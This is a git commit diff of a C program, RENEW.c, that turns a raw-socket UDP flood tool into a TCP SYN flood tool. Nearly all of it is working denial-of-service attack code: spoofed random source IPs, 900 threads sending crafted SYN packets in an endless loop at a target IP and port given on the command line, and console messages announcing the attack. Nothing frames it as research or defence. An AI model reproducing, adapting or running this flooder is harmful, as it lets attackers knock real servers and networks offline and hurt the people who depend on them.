c0449bd6a15c409a0540dcb3f8d08a2fd4c6f77f
RKxPJ <ay.an0007j@gmail.com>
2025-03-25 15:33:49 +0530

    Update RENEW.c

--- RENEW.c
+++ RENEW.c
@@ -5,72 +5,81 @@
 #include <pthread.h>
 #include <sys/socket.h>
 #include <netinet/ip.h>
-#include <netinet/udp.h>
+#include <netinet/tcp.h>
 #include <arpa/inet.h>
 #include <time.h>
 
-#define PAYLOAD_SIZE 1400    // Optimal for avoiding fragmentation
-#define THREAD_COUNT 1000    // Number of threads
-#define FLOOD_DURATION 120   // Attack duration in seconds
+#define THREAD_COUNT 900
+#define FLOOD_DURATION 120
 
-// UDP packet structure
-struct udp_packet {
+// Raw TCP packet structure
+struct tcp_packet {
     struct iphdr ip_header;
-    struct udphdr udp_header;
-    char payload[PAYLOAD_SIZE];
+    struct tcphdr tcp_header;
 };
 
-void *udp_flood(void *arg) {
+unsigned short checksum(unsigned short *buf, int len) {
+    unsigned long sum = 0;
+    while (len > 1) {
+        sum += *buf++;
+        len -= 2;
+    }
+    if (len == 1) sum += *(unsigned char *)buf;
+    sum = (sum >> 16) + (sum & 0xFFFF);
+    sum += (sum >> 16);
+    return (unsigned short)(~sum);
+}
+
+void *syn_flood(void *arg) {
     struct sockaddr_in *target = (struct sockaddr_in *)arg;
-    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    char packet[sizeof(struct tcp_packet)];
+    memset(packet, 0, sizeof(packet));
     
+    struct tcp_packet *tcp_pkt = (struct tcp_packet *)packet;
+    
+    // IP header
+    tcp_pkt->ip_header.ihl = 5;
+    tcp_pkt->ip_header.version = 4;
+    tcp_pkt->ip_header.tot_len = htons(sizeof(struct tcp_packet));
+    tcp_pkt->ip_header.id = htons(rand() % 65535);
+    tcp_pkt->ip_header.ttl = 64;
+    tcp_pkt->ip_header.protocol = IPPROTO_TCP;
+    tcp_pkt->ip_header.saddr = rand();  // Spoofed source IP
+    tcp_pkt->ip_header.daddr = target->sin_addr.s_addr;
+    
+    // TCP header
+    tcp_pkt->tcp_header.source = htons(rand() % 65535);
+    tcp_pkt->tcp_header.dest = target->sin_port;
+    tcp_pkt->tcp_header.seq = rand();
+    tcp_pkt->tcp_header.ack_seq = 0;
+    tcp_pkt->tcp_header.doff = 5;
+    tcp_pkt->tcp_header.syn = 1;
+    tcp_pkt->tcp_header.window = htons(5840);
+    tcp_pkt->tcp_header.check = 0;
+    
+    // Calculate checksums
+    tcp_pkt->tcp_header.check = checksum((unsigned short *)&tcp_pkt->tcp_header, sizeof(struct tcphdr));
+    
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (sock < 0) {
-        perror("socket (raw)");
+        perror("socket");
         return NULL;
     }
-
-    // Enable IP_HDRINCL to manually craft IP headers
+    
     int one = 1;
     if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
-        perror("setsockopt (IP_HDRINCL)");
+        perror("setsockopt");
         close(sock);
         return NULL;
     }
-
-    // Craft UDP packet
-    struct udp_packet packet;
-    memset(&packet, 0, sizeof(packet));
-
-    // IP header
-    packet.ip_header.ihl = 5;
-    packet.ip_header.version = 4;
-    packet.ip_header.tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOAD_SIZE);
-    packet.ip_header.id = htons(rand() % 65535);
-    packet.ip_header.ttl = 64;
-    packet.ip_header.protocol = IPPROTO_UDP;
-    packet.ip_header.saddr = rand();  // Spoofed source IP
-    packet.ip_header.daddr = target->sin_addr.s_addr;
-    packet.ip_header.check = 0;  // Let kernel compute checksum
-
-    // UDP header
-    packet.udp_header.source = htons(rand() % 65535);
-    packet.udp_header.dest = target->sin_port;
-    packet.udp_header.len = htons(sizeof(struct udphdr) + PAYLOAD_SIZE);
-    packet.udp_header.check = 0;  // Optional for IPv4
-
-    // Fill payload with random data
-    for (int i = 0; i < PAYLOAD_SIZE; i++) {
-        packet.payload[i] = rand() % 256;
-    }
-
-    // Flood loop
+    
     while (1) {
-        if (sendto(sock, &packet, sizeof(packet), 0, 
+        if (sendto(sock, packet, sizeof(packet), 0, 
             (struct sockaddr *)target, sizeof(*target)) < 0) {
             perror("sendto");
         }
     }
-
+    
     close(sock);
     return NULL;
 }
@@ -81,10 +90,8 @@ int main(int argc, char *argv[]) {
         return 1;
     }
 
-    // Initialize random seed
     srand(time(NULL));
-
-    // Set target
+    
     struct sockaddr_in target;
     target.sin_family = AF_INET;
     target.sin_port = htons(atoi(argv[2]));
@@ -93,12 +100,11 @@ int main(int argc, char *argv[]) {
         return 1;
     }
 
-    printf("[!] Starting UDP FLOOD on %s:%s\n", argv[1], argv[2]);
+    printf("[!] Starting TCP SYN Flood on %s:%s\n", argv[1], argv[2]);
 
-    // Launch threads
     pthread_t threads[THREAD_COUNT];
     for (int i = 0; i < THREAD_COUNT; i++) {
-        if (pthread_create(&threads[i], NULL, udp_flood, &target) != 0) {
+        if (pthread_create(&threads[i], NULL, syn_flood, &target) != 0) {
             perror("pthread_create");
             return 1;
         }
@@ -106,7 +112,5 @@ int main(int argc, char *argv[]) {
 
     sleep(FLOOD_DURATION);
     printf("[+] Attack finished\n");
-
-    // No cleanup (threads run infinitely)
     return 0;
 }
